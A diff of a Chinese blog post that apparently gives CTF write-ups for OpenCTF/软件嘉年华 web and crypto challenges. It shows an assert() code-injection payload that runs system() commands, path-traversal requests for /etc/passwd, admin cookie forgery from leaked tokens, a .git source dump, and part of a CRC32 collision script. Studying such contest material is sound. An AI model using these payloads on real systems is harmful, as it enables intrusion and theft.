@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="https://icyris.github.io">
   <title>OpenCTF WriteUp | Cyris | 绿生</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="软件嘉年华部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）">
+  <meta name="description" content="软件嘉年华部分题的题解。因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记(｡･∀･)ﾉﾞ。">
 <meta name="keywords" content="ctf,OpenCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="OpenCTF WriteUp">
 <meta property="og:url" content="https://icyris.github.io/2017/07/03/OpenCTF/index.html">
 <meta property="og:site_name" content="Cyris | 绿生">
-<meta property="og:description" content="软件嘉年华部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）">
-<meta property="og:updated_time" content="2017-07-03T17:38:23.883Z">
+<meta property="og:description" content="软件嘉年华部分题的题解。因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记(｡･∀･)ﾉﾞ。">
+<meta property="og:updated_time" content="2017-07-11T14:46:25.206Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OpenCTF WriteUp">
-<meta name="twitter:description" content="软件嘉年华部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）">
+<meta name="twitter:description" content="软件嘉年华部分题的题解。因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记(｡･∀･)ﾉﾞ。">
   
     <link rel="alternative" href="/atom.xml" title="Cyris | 绿生" type="application/atom+xml">
   
@@ -178,44 +178,355 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="http://hdopen.xctf.org.cn/" target="_blank" rel="external">软件嘉年华</a>部分题的题解。（因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记。）</p>
+        <p><a href="http://hdopen.xctf.org.cn/" target="_blank" rel="external">软件嘉年华</a>部分题的题解。因为是后来才做的，所以看了下队里拉的文档，文章内会注明思路提供者，这里仅作为学习笔记(｡･∀･)ﾉﾞ。</p>
 <a id="more"></a> 
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a><br>done by 一叶知秋    </p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a> </p>
 <p>参考链接： <a href="https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md</a>    </p>
 <p>在about页面看到：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I used:   </div><div class="line">  -<span class="ruby"> Git   </span></div><div class="line">  -<span class="ruby"> PHP   </span></div><div class="line">  -<span class="ruby"> Bootstrap</span></div></pre></td></tr></table></figure></p>
-<p>想到从/.git里拖个源码，这里用的<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a>：   </p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack<span class="selector-class">.py</span> http:<span class="comment">//202.112.51.184:8001/.git/</span></div></pre></td></tr></table></figure>
-<p>flag.php里的：     </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TODO</span></div><div class="line"><span class="comment">// $FLAG = '';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>index.php里的关键代码：      </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>); </div><div class="line">  </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>这里一叶知秋利用<a href="http://123.206.203.108/index.php/archives/15/" target="_blank" rel="external">assert函数引起的代码注射</a>构造payload：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?page='.system(<span class="string">"cd /var/www/html/;git diff;"</span>).<span class="symbol">'about</span></div></pre></td></tr></table></figure></p>
-<p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">diff --git a/templates/flag.php b/templates/flag.php</div><div class="line">index f8c9436.<span class="number">.1</span>d552ec <span class="number">100644</span></div><div class="line">--- a/templates/flag.php</div><div class="line">+++ b/templates/flag.php</div><div class="line">@@ <span class="number">-1</span>,<span class="number">4</span> +<span class="number">1</span> @@</div><div class="line">-<span class="meta">&lt;?php</span></div><div class="line">-<span class="comment">// TODO</span></div><div class="line">-<span class="comment">// $FLAG = '';</span></div><div class="line">-<span class="meta">?&gt;</span></div><div class="line">+<span class="meta">&lt;?php</span> $FLAG=<span class="string">"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;"</span>; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>先从/.git里拖个源码，这里用的<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a>：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack<span class="selector-class">.py</span> http:<span class="comment">//202.112.51.184:8001/.git/</span></div></pre></td></tr></table></figure></p>
+<p>flag.php里的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TODO</span></div><div class="line"><span class="comment">// $FLAG = '';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>index.php里的关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>); </div><div class="line">  </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span> $file;</div><div class="line"><span class="meta">?&gt;</span> ```              </div><div class="line"></div><div class="line">比较菜只能做到这里，之后一叶知秋利用[assert函数引起的代码注射](http:<span class="comment">//123.206.203.108/index.php/archives/15/)构造payload:   </span></div><div class="line">```?page=<span class="string">'.system("cd /var/www/html/;git diff;").'</span>about</div></pre></td></tr></table></figure></p>
+<p>得到:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">diff --git a/templates/flag.php b/templates/flag.php</div><div class="line">index f8c9436.<span class="number">.1</span>d552ec <span class="number">100644</span></div><div class="line">--- a/templates/flag.php</div><div class="line">+++ b/templates/flag.php</div><div class="line">@@ <span class="number">-1</span>,<span class="number">4</span> +<span class="number">1</span> @@</div><div class="line">-<span class="meta">&lt;?php</span></div><div class="line">-<span class="comment">// TODO</span></div><div class="line">-<span class="comment">// $FLAG = '';</span></div><div class="line">-<span class="meta">?&gt;</span></div><div class="line">+<span class="meta">&lt;?php</span> $FLAG=<span class="string">"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;"</span>; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <ul>
 <li>关于payload里的”/var/www/html/“，可以看看<a href="https://stackoverflow.com/questions/16197663/what-is-var-www-html" target="_blank" rel="external">https://stackoverflow.com/questions/16197663/what-is-var-www-html</a></li>
 </ul>
-<h2 id="web-150"><a href="#web-150" class="headerlink" title="web 150"></a>web 150</h2><p>URL: <a href="http://202.112.51.184:8002/" target="_blank" rel="external">http://202.112.51.184:8002/</a><br>done by ngc   </p>
+<h2 id="web150-400"><a href="#web150-400" class="headerlink" title="web150, 400"></a>web150, 400</h2><p>URL: <a href="http://202.112.51.184:8002/" target="_blank" rel="external">http://202.112.51.184:8002/</a>    </p>
 <p>参考链接：     </p>
 <ol>
 <li><a href="https://thegoonies.rocks/csaw-2016-wtf-sh-web/" target="_blank" rel="external">https://thegoonies.rocks/csaw-2016-wtf-sh-web/</a>            </li>
 <li><a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh" target="_blank" rel="external">https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh</a>     </li>
 </ol>
 <p>web150和web400这两题在上面的链接里都有详细的解答过程，这里稍微记录一下。</p>
-<p>先构造<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">202.112</span>.<span class="number">51.184</span>:<span class="number">8002</span><span class="regexp">/profile.wtf?user=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure></p>
+<p>这里有个登陆页面，想到passwd文件存放在/etc目录下，尝试构造<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">202.112</span>.<span class="number">51.184</span>:<span class="number">8002</span><span class="regexp">/profile.wtf?user=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure></p>
 <p>得到响应：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash<span class="string">'s posts:</span></span></div></pre></td></tr></table></figure></p>
-<p>再尝试读取</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/post.wtf?post=../users/</span></div></pre></td></tr></table></figure>
-<p>拉下来的列表里有一条包含admin的hash值与id的信息：        </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-poster"</span>&gt;</span>Posted by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile.wtf?user=Cv3uk"</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-title"</span>&gt;</span>822ec9ffd8e2e720b59e75d5c9047d690747af3e<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-body"</span>&gt;</span>tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>进入admin相关页面<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/profile.wtf?user=Cv3uk</span></div></pre></td></tr></table></figure></p>
-<p>然后伪造下cookie：</p>
-<pre><code>1. USERNAME = admin
-2. __cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e
-3. TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==
-</code></pre><p>最后在页面底部拿到flag。   </p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto-150"><a href="#crypto-150" class="headerlink" title="crypto 150"></a>crypto 150</h2><p>URL: <a href="http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar" target="_blank" rel="external">http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar</a><br>done by veritas501    </p>
+<p>再尝试读取<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/post.wtf?post=../users/</span></div></pre></td></tr></table></figure></p>
+<p>拉下来的列表里有一条包含admin的hash值与id的信息：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-poster"</span>&gt;</span>Posted by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile.wtf?user=Cv3uk"</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-title"</span>&gt;</span>822ec9ffd8e2e720b59e75d5c9047d690747af3e<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-body"</span>&gt;</span>tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==<span class="tag">&lt;/<span class="name">span</span>&gt;</span>```       </div><div class="line"></div><div class="line">进入admin相关页面</div></pre></td></tr></table></figure></p>
+<p><a href="http://202.112.51.184:8002/profile.wtf?user=Cv3uk" target="_blank" rel="external">http://202.112.51.184:8002/profile.wtf?user=Cv3uk</a><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">然后伪造下cookie：</div></pre></td></tr></table></figure></p>
+<ol>
+<li>USERNAME = admin</li>
+<li>__cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e</li>
+<li>TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==<br>```    </li>
+</ol>
+<p>最后在页面底部拿到flag。  </p>
+<p>400的题水平不够写不出来，看看上面的wp吧。</p>
+<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>URL: <a href="http://202.112.51.184:8000/cgi-bin/forms.pl" target="_blank" rel="external">http://202.112.51.184:8000/cgi-bin/forms.pl</a><br>原题： <a href="https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id" target="_blank" rel="external">https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id</a>   </p>
+<p>没太看懂解法，还在问土土师傅，之后补充。</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto-100"><a href="#crypto-100" class="headerlink" title="crypto 100"></a>crypto 100</h2><p>小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求.  </p>
+<p>这是妹纸给小明的谜语序列:EW91X2FYZV9HX2DVB2RFYM95=    </p>
+<p>适当把大写字母改成小写base64解一下就可以了。  </p>
+<h2 id="crypto-150"><a href="#crypto-150" class="headerlink" title="crypto 150"></a>crypto 150</h2><p>URL: <a href="http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar" target="_blank" rel="external">http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar</a><br>done by veritas501    </p>
 <p>分享一份veritas501关于带密码压缩包题的思路整理：<br><a href="http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more" target="_blank" rel="external">http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more</a></p>
-<p>这题采用的是crc32碰撞法。</p>
+<p>这题采用的是crc32碰撞法，脚本如下：  </p>
+<pre><code class="python">
+<span class="comment">#!/usr/bin/env python</span>
+<span class="comment"># CRC32 tools by Victor</span>
+<span class="comment">#usage: python crc32.py reverse 0xffffffff（the crc）</span>
+<span class="keyword">import</span> argparse
+<span class="keyword">import</span> os
+<span class="keyword">import</span> sys
+permitted_characters = set(
+    map(ord, <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_'</span>))  <span class="comment"># \w</span>
+testing = <span class="keyword">False</span>
+args = <span class="keyword">None</span>
+<span class="function"><span class="keyword">def</span> <span class="title">get_poly</span><span class="params">()</span>:</span>
+    poly = parse_dword(args.poly)
+    <span class="keyword">if</span> args.msb:
+        poly = reverseBits(poly)
+    check32(poly)
+    <span class="keyword">return</span> poly
+<span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span>
+    <span class="keyword">if</span> args.instr:
+        <span class="keyword">return</span> tuple(map(ord, args.instr))
+    <span class="keyword">with</span> args.infile <span class="keyword">as</span> f:  <span class="comment"># pragma: no cover</span>
+        <span class="keyword">return</span> tuple(map(ord, f.read()))
+<span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(msg)</span>:</span>
+    <span class="keyword">if</span> <span class="keyword">not</span> testing:  <span class="comment"># pragma: no cover</span>
+        args.outfile.write(msg)
+        args.outfile.write(os.linesep)
+table = []
+table_reverse = []
+<span class="function"><span class="keyword">def</span> <span class="title">init_tables</span><span class="params">(poly, reverse=True)</span>:</span>
+    <span class="keyword">global</span> table, table_reverse
+    table = []
+    <span class="comment"># build CRC32 table</span>
+    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):
+        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):
+            <span class="keyword">if</span> i &amp; <span class="number">1</span>:
+                i &gt;&gt;= <span class="number">1</span>
+                i ^= poly
+            <span class="keyword">else</span>:
+                i &gt;&gt;= <span class="number">1</span>
+        table.append(i)
+    <span class="keyword">assert</span> len(table) == <span class="number">256</span>, <span class="string">"table is wrong size"</span>
+    <span class="comment"># build reverse table</span>
+    <span class="keyword">if</span> reverse:
+        table_reverse = []
+        found_none = set()
+        found_multiple = set()
+        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):
+            found = []
+            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):
+                <span class="keyword">if</span> table[j] &gt;&gt; <span class="number">24</span> == i:
+                    found.append(j)
+            table_reverse.append(tuple(found))
+            <span class="keyword">if</span> <span class="keyword">not</span> found:
+                found_none.add(i)
+            <span class="keyword">elif</span> len(found) &gt; <span class="number">1</span>:
+                found_multiple.add(i)
+        <span class="keyword">assert</span> len(table_reverse) == <span class="number">256</span>, <span class="string">"reverse table is wrong size"</span>
+        <span class="keyword">if</span> found_multiple:
+            out(<span class="string">'WARNING: Multiple table entries have an MSB in {0}'</span>.format(
+                rangess(found_multiple)))
+        <span class="keyword">if</span> found_none:
+            out(<span class="string">'ERROR: no MSB in the table equals bytes in {0}'</span>.format(
+                rangess(found_none)))
+<span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(data, accum=<span class="number">0</span>)</span>:</span>
+    accum = ~accum
+    <span class="keyword">for</span> b <span class="keyword">in</span> data:
+        accum = table[(accum ^ b) &amp; <span class="number">0xFF</span>] ^ ((accum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>)
+    accum = ~accum
+    <span class="keyword">return</span> accum &amp; <span class="number">0xFFFFFFFF</span>
+<span class="function"><span class="keyword">def</span> <span class="title">rewind</span><span class="params">(accum, data)</span>:</span>
+    <span class="keyword">if</span> <span class="keyword">not</span> data:
+        <span class="keyword">return</span> (accum,)
+    stack = [(len(data), ~accum)]
+    solutions = set()
+    <span class="keyword">while</span> stack:
+        node = stack.pop()
+        prev_offset = node[<span class="number">0</span>] - <span class="number">1</span>
+        <span class="keyword">for</span> i <span class="keyword">in</span> table_reverse[(node[<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:
+            prevCRC = (((node[<span class="number">1</span>] ^ table[i]) &lt;&lt; <span class="number">8</span>) |
+                       (i ^ data[prev_offset])) &amp; <span class="number">0xFFFFFFFF</span>
+            <span class="keyword">if</span> prev_offset:
+                stack.append((prev_offset, prevCRC))
+            <span class="keyword">else</span>:
+                solutions.add((~prevCRC) &amp; <span class="number">0xFFFFFFFF</span>)
+    <span class="keyword">return</span> solutions
+<span class="function"><span class="keyword">def</span> <span class="title">findReverse</span><span class="params">(desired, accum)</span>:</span>
+    solutions = set()
+    accum = ~accum
+    stack = [(~desired,)]
+    <span class="keyword">while</span> stack:
+        node = stack.pop()
+        <span class="keyword">for</span> j <span class="keyword">in</span> table_reverse[(node[<span class="number">0</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:
+            <span class="keyword">if</span> len(node) == <span class="number">4</span>:
+                a = accum
+                data = []
+                node = node[<span class="number">1</span>:] + (j,)
+                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):
+                    data.append((a ^ node[i]) &amp; <span class="number">0xFF</span>)
+                    a &gt;&gt;= <span class="number">8</span>
+                    a ^= table[node[i]]
+                solutions.add(tuple(data))
+            <span class="keyword">else</span>:
+                stack.append(((node[<span class="number">0</span>] ^ table[j]) &lt;&lt; <span class="number">8</span>,) + node[<span class="number">1</span>:] + (j,))
+    <span class="keyword">return</span> solutions
+<span class="comment"># Tools</span>
+<span class="function"><span class="keyword">def</span> <span class="title">parse_dword</span><span class="params">(x)</span>:</span>
+    <span class="keyword">return</span> int(x, <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span>
+<span class="function"><span class="keyword">def</span> <span class="title">reverseBits</span><span class="params">(x)</span>:</span>
+    <span class="comment"># http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel</span>
+    <span class="comment"># http://stackoverflow.com/a/20918545</span>
+    x = ((x &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span>) | ((x &amp; <span class="number">0xAAAAAAAA</span>) &gt;&gt; <span class="number">1</span>)
+    x = ((x &amp; <span class="number">0x33333333</span>) &lt;&lt; <span class="number">2</span>) | ((x &amp; <span class="number">0xCCCCCCCC</span>) &gt;&gt; <span class="number">2</span>)
+    x = ((x &amp; <span class="number">0x0F0F0F0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &amp; <span class="number">0xF0F0F0F0</span>) &gt;&gt; <span class="number">4</span>)
+    x = ((x &amp; <span class="number">0x00FF00FF</span>) &lt;&lt; <span class="number">8</span>) | ((x &amp; <span class="number">0xFF00FF00</span>) &gt;&gt; <span class="number">8</span>)
+    x = ((x &amp; <span class="number">0x0000FFFF</span>) &lt;&lt; <span class="number">16</span>) | ((x &amp; <span class="number">0xFFFF0000</span>) &gt;&gt; <span class="number">16</span>)
+    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span>
+<span class="comment"># Compatibility with Python 2.6 and earlier.</span>
+<span class="keyword">if</span> hasattr(int, <span class="string">"bit_length"</span>):
+    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(num)</span>:</span>
+        <span class="keyword">return</span> num.bit_length()
+<span class="keyword">else</span>:
+    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(n)</span>:</span>
+        <span class="keyword">if</span> n == <span class="number">0</span>:
+            <span class="keyword">return</span> <span class="number">0</span>
+        bits = <span class="number">-32</span>
+        m = <span class="number">0</span>
+        <span class="keyword">while</span> n:
+            m = n
+            n &gt;&gt;= <span class="number">32</span>
+            bits += <span class="number">32</span>
+        <span class="keyword">while</span> m:
+            m &gt;&gt;= <span class="number">1</span>
+            bits += <span class="number">1</span>
+        <span class="keyword">return</span> bits
+<span class="function"><span class="keyword">def</span> <span class="title">check32</span><span class="params">(poly)</span>:</span>
+    <span class="keyword">if</span> poly &amp; <span class="number">0x80000000</span> == <span class="number">0</span>:
+        out(<span class="string">'WARNING: polynomial degree ({0}) != 32'</span>.format(bit_length(poly)))
+        out(<span class="string">'         instead, try'</span>)
+        out(<span class="string">'         0x{0:08x} (reversed/lsbit-first)'</span>.format(poly | <span class="number">0x80000000</span>))
+        out(<span class="string">'         0x{0:08x} (normal/msbit-first)'</span>.format(reverseBits(poly | <span class="number">0x80000000</span>)))
+<span class="function"><span class="keyword">def</span> <span class="title">reciprocal</span><span class="params">(poly)</span>:</span>
+    <span class="string">''' Return the reversed reciprocal (Koopman notatation) polynomial of a
+        reversed (lsbit-first) polynomial '''</span>
+    <span class="keyword">return</span> reverseBits((poly &lt;&lt; <span class="number">1</span>) | <span class="number">1</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">print_num</span><span class="params">(num)</span>:</span>
+    <span class="string">''' Write a numeric result in various forms '''</span>
+    out(<span class="string">'hex: 0x{0:08x}'</span>.format(num))
+    out(<span class="string">'dec:   {0:d}'</span>.format(num))
+    out(<span class="string">'oct: 0o{0:011o}'</span>.format(num))
+    out(<span class="string">'bin: 0b{0:032b}'</span>.format(num))
+<span class="keyword">import</span> itertools
+<span class="function"><span class="keyword">def</span> <span class="title">ranges</span><span class="params">(i)</span>:</span>
+    <span class="keyword">for</span> kg <span class="keyword">in</span> itertools.groupby(enumerate(i), <span class="keyword">lambda</span> x: x[<span class="number">1</span>] - x[<span class="number">0</span>]):
